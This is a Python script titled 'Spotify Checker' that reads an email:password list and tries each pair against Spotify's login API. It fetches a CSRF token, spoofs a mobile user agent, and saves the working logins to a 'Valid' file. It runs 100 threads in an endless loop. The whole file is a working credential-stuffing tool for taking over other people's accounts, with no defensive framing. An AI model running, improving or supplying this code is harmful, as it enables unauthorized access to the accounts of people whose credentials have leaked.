import requests 
import os
import threading
import time
from pypresence import Presence

RPC = Presence(client_id='746986385713659944')
RPC.connect()

if not os.path.exists('Checked'): os.makedirs('Checked')
lock = threading.Lock()
used = []

def SaveToFile(save_type, combo):
    if "Valid" in save_type:
        with open('Checked/Valid.txt', 'a+') as f: f.write(combo+'\n') # Save Valids
    elif "Invalid" in save_type:
        with open('Checked/Invalid.txt', 'a+') as f: f.write(combo+'\n') # Save Invalids

class Spotify():
    def Get_CSFR(): # Fetchs The CSFR Token, Used To Login To The Account :)
        while True:
            r = requests.get('https://accounts.spotify.com/')
            if r.status_code == 200: # If It Can Successfully Send A Request To Spotify It Will Break / End The While True Loop
               break
            else:
                pass

        return r.cookies.get("csrf_token") # Fetchs The CSRF Token From The Response Cookies

    def Login(combo):
        global used
        csrf_token = Spotify.Get_CSFR() # Fetchs The CSFR Token
        with open(combo, "r") as DaComboFile: 
            for line in DaComboFile:
                line = line.replace('\n', '')
                Account_Combo = line.split(':')
                email = Account_Combo[0]
                password = Account_Combo[1]
                if email+':'+password in used:
                    return
                else:    
                    payload = {"remember": "false", "username": email,"password": password,"csrf_token": csrf_token}    
                    used.append(email+':'+password)       
                    headers = {
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4",
                        "Accept": "application/json, text/plain",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    cookies = {
                        "csrf_token": csrf_token,
                        "__bon": "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE="
                    }
                    r = requests.post('https://accounts.spotify.com/api/login', data=payload, headers=headers, cookies=cookies) # Sends A REQ To The API Asking If I Can Login <3
                    if "displayName" in r.text:
                        lock.acquire()
                        print('[\u001b[32mVALID\u001b[37m] %s:%s' % (email, password)) # Valid Account
                        SaveToFile('Valid', f'{email}:{password}')
                        lock.release()
                    elif "errorInvalidCredentials" in r.text:
                        lock.acquire()
                        print('[\u001b[31mINVALID\u001b[37m] %s:%s' % (email, password)) # Invalid Account
                        SaveToFile('Invalid', f'{email}:{password}')
                        lock.release()
                    elif "errorCSRF" in r.text:
                        lock.acquire()
                        print('[\u001b[31mERROR\u001b[37m] %s:%s' % (email, password)) # CSRF Token Is Invalid So The Request Fucked Up
                        lock.release()
                    else:
                        lock.acquire()
                        print('[\u001b[31mERROR\u001b[37m] %s:%s' % (email, password)) # Else Its An Error Just Meh
                        lock.release()

if __name__ == "__main__":
    os.system('title [Spotify Checker] By Dropout & cls')
    print('''\u001b[32m                                            ____ ___  ____ ___ _ ____ _   _       
                                            [__  |__] |  |  |  | |___  \_/        
                                            ___] |    |__|  |  | |      |  By Dropout        \n''')
    combo_input = input('\u001b[32m>\u001b[37m Combo File\u001b[32m:\u001b[37m ')
    print()
    if ".txt" in combo_input:
        combo = f'{combo_input}'
    else:
        combo = f'{combo_input}.txt'    
    try:
        with open(combo, "r") as DaComboFile: pass
    except FileNotFoundError:
        print('\u001b[32m>\u001b[37m Invalid File')
        os.system('pause >NUL')  
        os._exit(0)
    while True:
        for i in range(100):
            threads = threading.Thread(target=Spotify.Login, args=(combo,))    
            threads.start() # I Got Sick On Commenting
